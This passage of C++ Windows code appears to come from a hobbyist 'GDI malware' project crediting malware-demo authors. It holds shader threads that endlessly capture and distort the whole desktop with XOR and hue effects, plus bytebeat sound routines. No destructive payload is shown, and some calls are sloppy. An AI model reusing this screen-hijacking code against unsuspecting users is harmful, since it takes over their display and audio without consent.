	COLORREF rainbowColors[numColors] = { RGB(255, 0, 0), RGB(255, 127, 0), RGB(255, 255, 0), RGB(0, 255, 0), RGB(0, 0, 255), RGB(75, 0, 130) };

	int offsetX = 0;  // Initial horizontal movement offset
	int offsetY = 0;  // Initial vertical movement offset

	for (int frame = 0;; frame += 25) {
		HDC deskMem = CreateCompatibleDC(desk);  // Create memory device context
		HBITMAP scr = CreateDIBSection(desk, &bmi, DIB_RGB_COLORS, (void**)&rgbtriple, 0, 0);  // Create bitmap
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);  // Copy desktop screen content

		// Apply the XOR fractal and rainbow effect
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sw;
			int t = (x ^ y) + frame;  // XOR fractal effect with movement

			// Rainbow effect cycling based on the t value
			int colorIndex = (t / 50) % numColors;
			rgbtriple[i].rgbtRed = GetRValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtGreen = GetGValue(rainbowColors[colorIndex]);
			rgbtriple[i].rgbtBlue = GetBValue(rainbowColors[colorIndex]);
		}

		// Update the position to move content forward (up-left)
		offsetX = (frame / 10) % sw;  // Adjust for smooth movement in X direction
		offsetY = (frame / 10) % sh;  // Adjust for smooth movement in Y direction

		// Wrap the content to stay on screen (wrap horizontally and vertically)
		if (offsetX != 0 || offsetY != 0) {
			BitBlt(desk, 0, 0, sw - offsetX, sh - offsetY, deskMem, offsetX, offsetY, SRCCOPY);  // Copy the portion that remains visible
			BitBlt(desk, sw - offsetX, 0, offsetX, sh - offsetY, deskMem, 0, offsetY, SRCCOPY);  // Wrap horizontally
			BitBlt(desk, 0, sh - offsetY, sw - offsetX, offsetY, deskMem, offsetX, 0, SRCCOPY);  // Wrap vertically
			BitBlt(desk, sw - offsetX, sh - offsetY, offsetX, offsetY, deskMem, 0, 0, SRCCOPY);  // Wrap both horizontally and vertically
		}

		// Cleanup
		DeleteObject(scr);
		DeleteDC(deskMem);

		// Delay for next frame
		Sleep(10);  // Adjust the speed of movement (higher values slow it down)
	}

	ReleaseDC(wnd, desk);  // Release desktop device context
	return 0;
}
DWORD WINAPI shader3(LPVOID lpParam) {//credits to WinMalware
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);

	// Initialize random seed
	srand(static_cast<unsigned int>(time(0)));

	int offsetX = 0;
	float zoomFactor = 1.0f;
	int frameCount = 0;

	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

		// Increase the zoom factor over time for fast zoom-in effect
		zoomFactor += 0.005f + powf(frameCount / 300.0f, 2.0f) * 0.0005f; // Gradually speed up the zoom

		// Blue background moving horizontally
		offsetX = (offsetX + 2) % w;

		for (INT i = 0; i < w * h; i++) {
			// Calculate scaled coordinates to create zoom effect
			INT x = (i % w - w / 2) / zoomFactor + w / 2;
			INT y = (i / w - h / 2) / zoomFactor + h / 2;

			if (x < 0 || x >= w || y < 0 || y >= h) continue; // Avoid out-of-bound errors

			// Set the moving blue background
			rgbScreen[i].r = 0;
			rgbScreen[i].g = 0;
			rgbScreen[i].b = 255 * ((x + offsetX) % w < w / 2 ? 1 : 0); // Alternating moving background

			// XOR fractal split into two halves
			if (x < w / 2) { // Left half (red fractal)
				if ((x ^ y) % 20 < 10) {
					rgbScreen[i].r = 255;
					rgbScreen[i].g = 0;
					rgbScreen[i].b = 0;
				}
			}
			else { // Right half (cyan fractal)
				if ((x ^ y) % 20 < 10) {
					rgbScreen[i].r = 0;
					rgbScreen[i].g = 255;
					rgbScreen[i].b = 255;
				}
			}
		}

		// Render the modified bitmap
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(10);
		frameCount++;
		ReleaseDC(NULL, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb ^= (x * x + i) ^ (y * y + i) | x * y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI shader5(LPVOID lpvd) //credits to pankoza,but i modified it
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;

	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;

				int fx = (int)((8 ^ i) + ((8 - i) * cbrt(x - 36.0)) + (4 * i) + ((4 * i) * sin(y + 28.0)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc); DeleteDC(hdc);
		Sleep(20);
	}

	return 0x00;
}
DWORD WINAPI shader6(LPVOID lpvd)
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;

	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = screenWidth;
	bmpi.bmiHeader.biHeight = screenHeight;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;


	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;

	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);

	INT i = 0;

	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

		RGBQUAD rgbquadCopy;

		for (int x = 0; x < screenWidth; x++)
		{
			for (int y = 0; y < screenHeight; y++)
			{
				int index = y * screenWidth + x;

				int fx = (int)(sin(i ^ 4) + (i * 4) * sqrt(RGB(x, y, x)));

				rgbquadCopy = rgbquad[index];

				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);

				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}

		i++;

		StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}

	return 0x00;
}
DWORD WINAPI shader7(LPVOID lpvd)//credits to pankoza
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed = x & y;
			rgbtriple[i].rgbtGreen += x ^ y;
			rgbtriple[i].rgbtBlue += t + i;
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, -30, 0, SRCCOPY);
		BitBlt(desk, 0, 0, sw, sh, deskMem, sw - 30, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}
DWORD WINAPI shader8(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	_RGBQUAD* data = (_RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	for (int i = 0;; i++, i %= 3) {
		HDC desk = GetDC(NULL);
		HDC hdcdc = CreateCompatibleDC(desk);
		HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcdc, hbm);
		BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; i < w * h; i++) {
			data[i].rgb = Hue(239);
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
		DeleteObject(hbm);
		DeleteObject(hdcdc);
		DeleteObject(desk);
	}
	return 0;
}

VOID WINAPI sound1() {
	int nSamplesPerSec = 16000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((7 + (t >> 8)) * (t ^ t + (t >> 7 & 8 | t >> 9 & 11 | -t >> 78 & 91)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound2() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(3 * (t * (1 | (t >> 14 - (t >> 51) % 4) % 19) & (2 << (t >> 13) ^ 6) * (5 | (t >> 35) % 8)) * (t >> 9));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound3() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t + ((t / 24) & t + (t / 2) >> 4 * (24 * t)) - t * (t - 2 ^ t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound4() {
	int nSamplesPerSec = 44100, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(~(13 * t & t >> 13 & t >> 13) * t >> 7);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound5() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> 8 | t) * (t >> (t % 16384 >= 8192 ? 6 : 8)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound6() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t ^ (t >> t | t) >> 6) + (2 * t)) | (t & t + (t >> 12)) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound7() {//credits to WinMalware
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * (t | t >> 5) ^ (t >> 6 & 3));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound8() {//credits to WinMalware
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(~t + (t ^ (t >> 6)) * 5);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound9() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(~(t & 31 * t | t >> 4) + ~(t | t >> 15 * t << 9) * ~(t >> 26) + (2 * t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound10() {//credits to pankoza, but i modified it
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * ((t & 4096 ? t % 65536 < 59392 ? 7 : t >> 6 : 16) + (1 & t >> 14)) | t >> (t & 16384 ? t & 4096 ? 10 : 3 : 2)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((3 * t) * ~(31 & t >> 4 + t * (15 & t >> 9) & 0xACCEED * (26 & t >> 5) & t >> 3) % 589 - (2 * t) ^ (2 * t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound12() {
	int nSamplesPerSec = 20000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((3 * t) | ((14 * t * ((t >> 1) & (t >> 9))) >> 2) / (t + 1));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound13() {
	int nSamplesPerSec = 29000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(sin(t * (t >> 13 & t >> 14 & 7) ^ t - t / 256 | 2 * (t >> 13 & t >> 14 & 3) * t & t >> 8 | 4 * t & t >> 6) * 127);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI sound14() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11025 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t >> (t >> 12) % 4) + t * (1 + (1 + (t >> 16) % 6) * (t >> 10) * (t >> 11) % 8) ^ t >> 13 ^ t >> 6);

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {//credits to N17Pro3426
	int nSamplesPerSec = 4000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(2 * t ^ 2 * t + (t >> 7) & t >> 12 | t >> 4 - (1 ^ 7 & t >> 19) | t >> 7);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
